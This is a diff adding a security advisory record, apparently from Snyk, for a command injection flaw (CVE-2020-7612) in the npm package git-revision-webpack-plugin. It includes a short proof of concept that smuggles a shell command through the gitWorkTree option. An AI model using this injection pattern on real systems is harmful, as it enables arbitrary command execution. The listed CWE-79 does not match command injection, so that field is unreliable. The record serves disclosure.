@@ -1,0 +1,42 @@
+---
+- id: snykio:npm:git-revision-webpack-plugin:561775
+  title: Command Injection
+  description: |
+    [git-revision-webpack-plugin][1] is a simple webpack plugin that
+    generates version and commithash files during build based on a local git
+    repository.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    The function `commithash` within `lib/helpers/run-git-command.js` takes
+    user input, and is passed to the `gitCommand` argument without any
+    sanitization.
+
+    ### PoC   {#poc}
+
+        var Root = require("git-revision-webpack-plugin");
+        var opt = {
+        "gitWorkTree": "& echo vulnerable > create.txt &"
+         }
+        var root = new Root(opt);
+        root.commithash();
+
+
+
+    [1]: https://www.npmjs.com/package/git-revision-webpack-plugin
+  affected_package: git-revision-webpack-plugin
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cve:
+  - CVE-2020-7612
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-04-01
+  created_date: 2020-04-01
+  last_modified_date: 2020-04-01
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/pirelenito/git-revision-webpack-plugin/blob/master/lib/helpers/run-git-command.js#L25
+  source_url: https://snyk.io/vuln/SNYK-JS-GITREVISIONWEBPACKPLUGIN-561775
